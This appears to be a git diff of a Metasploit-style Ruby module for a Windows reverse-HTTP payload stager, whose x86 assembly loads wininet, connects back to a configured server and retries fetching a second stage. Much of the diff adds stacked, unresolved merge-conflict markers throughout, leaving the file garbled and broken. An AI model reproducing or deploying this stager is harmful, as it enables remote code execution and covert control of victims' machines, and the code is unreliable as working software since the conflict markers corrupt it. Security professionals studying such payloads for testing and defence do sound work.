@@ -8,6 +8,7 @@ require 'msf/core'
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
+<<<<<<< HEAD
 require 'msf/core/payload/windows/block_api'
 require 'msf/core/payload/windows/exitfunk'
 
@@ -25,6 +26,8 @@ module Msf
 >>>>>>> rapid7/master
 =======
 >>>>>>> rapid7/master
+=======
+>>>>>>> master
 =======
 >>>>>>> master
 require 'msf/core/payload/transport_config'
@@ -40,6 +43,7 @@ module Msf
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
+<<<<<<< HEAD
 >>>>>>> rapid7/master
 =======
 >>>>>>> rapid7/master
@@ -51,6 +55,8 @@ module Msf
 >>>>>>> rapid7/master
 =======
 >>>>>>> rapid7/master
+=======
+>>>>>>> master
 =======
 >>>>>>> master
 ###
@@ -66,6 +72,7 @@ module Msf
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
+<<<<<<< HEAD
 
 module Payload::Windows::ReverseHttp
 
@@ -82,6 +89,8 @@ module Payload::Windows::ReverseHttp
 >>>>>>> rapid7/master
 =======
 >>>>>>> rapid7/master
+=======
+>>>>>>> master
 =======
 >>>>>>> master
 module Payload::Windows::ReverseHttp
@@ -97,6 +106,7 @@ module Payload::Windows::ReverseHttp
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
+<<<<<<< HEAD
 >>>>>>> rapid7/master
 =======
 >>>>>>> rapid7/master
@@ -110,12 +120,15 @@ module Payload::Windows::ReverseHttp
 >>>>>>> rapid7/master
 =======
 >>>>>>> master
+=======
+>>>>>>> master
 
   #
   # Register reverse_http specific options
   #
   def initialize(*args)
     super
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -139,6 +152,8 @@ module Payload::Windows::ReverseHttp
 >>>>>>> rapid7/master
 =======
 >>>>>>> master
+=======
+>>>>>>> master
     register_advanced_options([
         OptInt.new('StagerURILength', [false, 'The URI length for the stager (at least 5 bytes)']),
         OptInt.new('StagerRetryCount', [false, 'The number of times the stager should retry if the first connect fails', 10]),
@@ -147,6 +162,7 @@ module Payload::Windows::ReverseHttp
         OptString.new('PayloadProxyUser', [false, 'An optional proxy server username']),
         OptString.new('PayloadProxyPass', [false, 'An optional proxy server password']),
         OptEnum.new('PayloadProxyType', [false, 'The type of HTTP proxy (HTTP or SOCKS)', 'HTTP', ['HTTP', 'SOCKS']])
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -166,12 +182,15 @@ module Payload::Windows::ReverseHttp
 >>>>>>> rapid7/master
 =======
 >>>>>>> master
+=======
+>>>>>>> master
       ], self.class)
   end
 
   #
   # Generate the first stage
   #
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -210,6 +229,8 @@ module Payload::Windows::ReverseHttp
 >>>>>>> rapid7/master
 =======
 >>>>>>> master
+=======
+>>>>>>> master
   def generate(opts={})
     conf = {
       ssl:         opts[:ssl] || false,
@@ -239,6 +260,7 @@ module Payload::Windows::ReverseHttp
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
+<<<<<<< HEAD
 >>>>>>> rapid7/master
 =======
 >>>>>>> rapid7/master
@@ -250,6 +272,8 @@ module Payload::Windows::ReverseHttp
 >>>>>>> rapid7/master
 =======
 >>>>>>> rapid7/master
+=======
+>>>>>>> master
 =======
 >>>>>>> master
     generate_reverse_http(conf)
@@ -277,6 +301,7 @@ module Payload::Windows::ReverseHttp
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
+<<<<<<< HEAD
   # TODO: Use the CachedSize instead (PR #4894)
   def cached_size
     321
@@ -293,11 +318,14 @@ module Payload::Windows::ReverseHttp
 >>>>>>> rapid7/master
 =======
 >>>>>>> master
+=======
+>>>>>>> master
   #
   # Generate the transport-specific configuration
   #
   def transport_config(opts={})
     transport_config_reverse_http(opts)
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -317,12 +345,15 @@ module Payload::Windows::ReverseHttp
 >>>>>>> rapid7/master
 =======
 >>>>>>> master
+=======
+>>>>>>> master
   end
 
   #
   # Generate the URI for the initial stager
   #
   def generate_uri
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -362,6 +393,8 @@ module Payload::Windows::ReverseHttp
 >>>>>>> rapid7/master
 =======
 >>>>>>> master
+=======
+>>>>>>> master
 
     uri_req_len = datastore['StagerURILength'].to_i
 
@@ -388,6 +421,7 @@ module Payload::Windows::ReverseHttp
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
+<<<<<<< HEAD
 >>>>>>> rapid7/master
 =======
 >>>>>>> rapid7/master
@@ -399,6 +433,8 @@ module Payload::Windows::ReverseHttp
 >>>>>>> rapid7/master
 =======
 >>>>>>> rapid7/master
+=======
+>>>>>>> master
 =======
 >>>>>>> master
   end
@@ -413,6 +449,7 @@ module Payload::Windows::ReverseHttp
     # Add 100 bytes for the encoder to have some room
     space += 100
 
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -450,10 +487,15 @@ module Payload::Windows::ReverseHttp
     # Make room for the maximum possible URL length
     space += 256
 >>>>>>> master
+=======
+    # Make room for the maximum possible URL length
+    space += 256
+>>>>>>> master
 
     # EXITFUNK processing adds 31 bytes at most (for ExitThread, only ~16 for others)
     space += 31
 
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -496,11 +538,17 @@ module Payload::Windows::ReverseHttp
     space += 200
 
 >>>>>>> master
+=======
+    # Proxy options?
+    space += 200
+
+>>>>>>> master
     # The final estimated size
     space
   end
 
   #
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -551,6 +599,8 @@ module Payload::Windows::ReverseHttp
 >>>>>>> rapid7/master
 =======
 >>>>>>> rapid7/master
+=======
+>>>>>>> master
 =======
 >>>>>>> master
   # Generate an assembly stub with the configured feature set and options.
@@ -622,6 +672,7 @@ module Payload::Windows::ReverseHttp
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
+<<<<<<< HEAD
 >>>>>>> rapid7/master
 =======
 >>>>>>> rapid7/master
@@ -635,10 +686,13 @@ module Payload::Windows::ReverseHttp
 >>>>>>> rapid7/master
 =======
 >>>>>>> master
+=======
+>>>>>>> master
     end
 
     asm = %Q^
       ;-----------------------------------------------------------------------------;
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -667,11 +721,14 @@ module Payload::Windows::ReverseHttp
 >>>>>>> rapid7/master
 =======
 >>>>>>> master
+=======
+>>>>>>> master
       ; Compatible: Confirmed Windows 8.1, Windows 7, Windows 2008 Server, Windows XP SP1, Windows SP3, Windows 2000
       ; Known Bugs: Incompatible with Windows NT 4.0, buggy on Windows XP Embedded (SP1)
       ;-----------------------------------------------------------------------------;
 
       ; Input: EBP must be the address of 'api_call'.
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -691,6 +748,8 @@ module Payload::Windows::ReverseHttp
 >>>>>>> rapid7/master
 =======
 >>>>>>> master
+=======
+>>>>>>> master
       ; Clobbers: EAX, ESI, EDI, ESP will also be modified (-0x1A0)
       load_wininet:
         push 0x0074656e        ; Push the bytes 'wininet',0 onto the stack.
@@ -698,6 +757,7 @@ module Payload::Windows::ReverseHttp
         push esp               ; Push a pointer to the "wininet" string on the stack.
         push 0x0726774C        ; hash( "kernel32.dll", "LoadLibraryA" )
         call ebp               ; LoadLibraryA( "wininet" )
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -741,6 +801,8 @@ module Payload::Windows::ReverseHttp
 >>>>>>> rapid7/master
 =======
 >>>>>>> master
+=======
+>>>>>>> master
         xor ebx, ebx           ; Set ebx to NULL to use in future arguments
       ^
 
@@ -782,6 +844,7 @@ module Payload::Windows::ReverseHttp
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
+<<<<<<< HEAD
 >>>>>>> rapid7/master
 =======
 >>>>>>> rapid7/master
@@ -795,10 +858,13 @@ module Payload::Windows::ReverseHttp
 >>>>>>> rapid7/master
 =======
 >>>>>>> master
+=======
+>>>>>>> master
         push ebx               ; password (NULL)
         push ebx               ; username (NULL)
         push #{opts[:port]}    ; PORT
         call got_server_uri    ; double call to get pointer for both server_uri and
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -826,6 +892,8 @@ module Payload::Windows::ReverseHttp
 >>>>>>> rapid7/master
 =======
 >>>>>>> rapid7/master
+=======
+>>>>>>> master
 =======
 >>>>>>> master
       server_uri:              ; server_host; server_uri is saved in EDI for later
@@ -881,6 +949,7 @@ module Payload::Windows::ReverseHttp
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
+<<<<<<< HEAD
 >>>>>>> rapid7/master
 =======
 >>>>>>> rapid7/master
@@ -894,12 +963,15 @@ module Payload::Windows::ReverseHttp
 >>>>>>> rapid7/master
 =======
 >>>>>>> master
+=======
+>>>>>>> master
         push #{"0x%.8x" % http_open_flags}   ; dwFlags
         push ebx               ; accept types
         push ebx               ; referrer
         push ebx               ; version
         push edi               ; server URI
         push ebx               ; method
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -929,10 +1001,14 @@ module Payload::Windows::ReverseHttp
 =======
         push esi               ; hConnection
 >>>>>>> master
+=======
+        push esi               ; hConnection
+>>>>>>> master
         push 0x3B2E55EB        ; hash( "wininet.dll", "HttpOpenRequestA" )
         call ebp
         xchg esi, eax          ; save hHttpRequest in esi
 
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -974,6 +1050,8 @@ module Payload::Windows::ReverseHttp
 >>>>>>> rapid7/master
 =======
 >>>>>>> master
+=======
+>>>>>>> master
       ; Store our retry counter in the edi register
       set_retry:
         push #{retry_count}
@@ -1001,6 +1079,7 @@ module Payload::Windows::ReverseHttp
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
+<<<<<<< HEAD
 >>>>>>> rapid7/master
 =======
 >>>>>>> rapid7/master
@@ -1012,6 +1091,8 @@ module Payload::Windows::ReverseHttp
 >>>>>>> rapid7/master
 =======
 >>>>>>> rapid7/master
+=======
+>>>>>>> master
 =======
 >>>>>>> master
     end
@@ -1033,6 +1114,7 @@ module Payload::Windows::ReverseHttp
         jnz send_request
 
       ; if we didn't allocate before running out of retries, bail out
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -1115,6 +1197,8 @@ module Payload::Windows::ReverseHttp
 >>>>>>> rapid7/master
 =======
 >>>>>>> master
+=======
+>>>>>>> master
     ^
 
     if opts[:exitfunk]
@@ -1184,6 +1268,7 @@ module Payload::Windows::ReverseHttp
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
+<<<<<<< HEAD
 >>>>>>> rapid7/master
 =======
 >>>>>>> rapid7/master
@@ -1195,6 +1280,8 @@ module Payload::Windows::ReverseHttp
 >>>>>>> rapid7/master
 =======
 >>>>>>> rapid7/master
+=======
+>>>>>>> master
 =======
 >>>>>>> master
     asm
@@ -1221,6 +1308,7 @@ module Payload::Windows::ReverseHttp
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
+<<<<<<< HEAD
 
 =======
 >>>>>>> rapid7/master
@@ -1234,6 +1322,8 @@ module Payload::Windows::ReverseHttp
 >>>>>>> rapid7/master
 =======
 >>>>>>> rapid7/master
+=======
+>>>>>>> master
 =======
 >>>>>>> master
 end
